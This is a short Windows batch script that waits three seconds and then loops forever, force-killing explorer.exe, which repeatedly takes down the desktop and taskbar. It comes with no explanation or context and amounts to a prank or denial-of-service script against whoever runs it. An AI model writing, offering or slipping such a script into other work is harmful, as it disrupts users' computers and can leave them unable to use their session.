powershell start-sleep 3
goto loop
:loop
taskkill /f /im explorer.exe
goto loop